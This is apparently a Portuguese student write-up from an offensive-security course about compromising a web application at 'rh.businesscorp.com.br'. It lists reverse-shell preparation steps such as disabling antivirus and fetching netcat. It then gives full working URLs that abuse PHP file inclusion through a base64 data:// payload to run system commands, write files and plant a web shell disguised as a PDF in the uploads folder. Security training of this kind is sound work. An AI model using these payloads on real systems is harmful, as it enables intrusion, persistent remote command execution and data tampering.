# 🔍 Exploração do Site — 👨‍🔬 Penetratium ☢️ - 🧬 Team 📡

## 🔗 Materia Segurança Ofensiva 📕

- 👨‍🏫 **Professor:** JPGress
- 🔍 **Tipo:** Shell Reversa 🕳️

---

- Script:
  - Saber o ip da sua MAQ
  - Desligar antivirus da maquina.
  - Baixar o nc pro win ( no meu caso {pc bugado}).
  - Escutar de um lado e mandar o sinal do outro.
  - Mandar sinal pela URL , ou upar arquivo.
  - Executar arquivo e receber o Sinal.

---

# Desligando Antivirus:
<p align="center">
  <img width="319" height="265" alt="image" src="https://github.com/user-attachments/assets/3f997066-36e2-418d-a67a-3317880f0224" />
</p>

<p align="center">
  <img width="589" height="982" alt="image" src="https://github.com/user-attachments/assets/ab971d68-deb8-46b2-b6e8-5791407107f9" />
</p>

# Baixando NC:win
<p align="center">
  <img width="383" height="332" alt="image" src="https://github.com/user-attachments/assets/b313b975-e39f-4e95-96be-c41b3380d39b" />
</p>

--- 
- https://github.com/diegocr/netcat/blob/master/nc.exe
<p align="center">
  <img width="522" height="512" alt="image" src="https://github.com/user-attachments/assets/e76a7de6-f0a2-494e-ac38-2a156713142f" />
</p>

---
- Descobri onde se encontra o banco de Dados da aplicação agora é so mandar um arquivo .pdf malicioso pra lá e executar

link : http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls%20-la%20/var/www/html/uploads
<p align="center">  
  <img width="472" height="150" alt="image" src="https://github.com/user-attachments/assets/9476b697-f51f-469b-86ef-0e02fc1fcd08" />
</p>

- esse arquivo Proposta de Atividade.pdf foi eu que enviei testando a pagina de upload
- Provando que aqui se instala o banco de dados da pagina

comando que envia pdf malicioso pro site 
```
  http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20%27%25PDF-1.4%0A%25%E2%E3%CF%D3%0A%0A%3C?  php%20echo%20%22TESTE%20FUNCIONOU%22%3B%20%3F%3E%27%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2Fteste.pdf

```
- testando se relamente funcionou : http://rh.businesscorp.com.br/uploads/teste.pdf
<p align="center">
  <img width="477" height="83" alt="image" src="https://github.com/user-attachments/assets/16a55f59-ce69-440a-b049-861819f3f9fe" />
</p>
---

- agora é so mandar um arquivo de uma prompt de comando .pdf , ou mandar um arquivo direto com o shell reverse

comando que envia o prompt de comando .pdf pro site : 

```
  http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20'%25PDF-1.4%0A%25%E2%E3%CF%D3%0A%0A%3C?    php%20echo%20%22%3Cform%20method%3DGET%3E%3Cinput%20type%3Dtext%20name%3Dcmd%20placeholder%3DDigite%20um%20comando%3E%3Cinput%20type%3Dsubmit%20value%3DExecutar%3E%3C%2Fform%3E%3Cpre%3E%22%3B%20if(isset(%24_GET%5B%22  cmd%22%5D))%20%7B%20system(%24_GET%5B%22cmd%22%5D)%3B%20%7D%20echo%20%22%3C%2Fpre%3E%22%3B%20%3F%3E'%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2Fcmd.pdf
```

- agora vamos acessa-lo como acessamos o arquivo teste: http://rh.businesscorp.com.br/uploads/cmd.pdf

<p align="center">
  <img width="488" height="132" alt="image" src="https://github.com/user-attachments/assets/ab571ec0-a668-4244-98ab-ffc7f5c209ec" />
</p>

- Temos um aprimoramento de CMD.










- aqui voce pode criar arquivos dar permissao e apaga-los uma falha gravissima
